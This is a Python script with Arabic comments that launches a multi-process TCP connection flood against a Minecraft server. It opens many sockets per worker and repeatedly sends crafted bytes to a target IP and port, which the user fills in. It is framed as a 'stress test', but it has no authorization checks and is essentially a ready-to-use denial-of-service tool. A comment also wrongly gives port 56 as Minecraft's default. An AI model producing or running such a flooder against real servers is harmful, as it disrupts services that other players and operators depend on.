import socket
import time
from multiprocessing import Process, cpu_count

# ==========================================
# إعدادات الهدف (سيرفر ماين كرافت)
# ==========================================
TARGET_IP = ""  # ضع آيباد سيرفر ماين كرافت هنا
TARGET_PORT = 56           # منفذ ماين كرافت الافتراضي
DURATION = 30                 # مدة التشغيل بالثواني
SOCKETS_PER_WORKER = 20       # عدد اتصالات TCP المفتوحة في كل عملية

def mc_stress_worker(ip, port, duration):
    end_time = time.time() + duration
    
    while time.time() < end_time:
        active_sockets = []
        
        # فتح اتصالات TCP متعددة بشكل متزامن
        for _ in range(SOCKETS_PER_WORKER):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setblocking(False)
                s.connect_ex((ip, port))
                active_sockets.append(s)
            except Exception:
                pass
                
        # إرسال بيانات وهمية متتالية لإشغال المقابس وإرهاق المعالج
        dummy_data = b"\xfe\x01\xfa" * 10
        while time.time() < end_time and active_sockets:
            for s in list(active_sockets):
                try:
                    s.send(dummy_data)
                except Exception:
                    active_sockets.remove(s)
                    
        # إغلاق المقابس عند انتهاء الدورة لتجديد الاتصالات
        for s in active_sockets:
            try:
                s.close()
            except Exception:
                pass

def main():
    # مضاعفة العمليات بناءً على طاقة معالج الجهاز
    workers = cpu_count() * 4
    print(f"[*] بدء ضغط TCP على سيرفر ماين كرافت {TARGET_IP}:{TARGET_PORT} بـ {workers} عملية متوازية...")
    
    processes = []
    for _ in range(workers):
        p = Process(target=mc_stress_worker, args=(TARGET_IP, TARGET_PORT, DURATION))
        processes.append(p)
        p.start()
        
    for p in processes:
        p.join()
        
    print("[*] انتهى وقت الاختبار وتوقف إرسال الطلبات.")

if __name__ == '__main__':
    main()
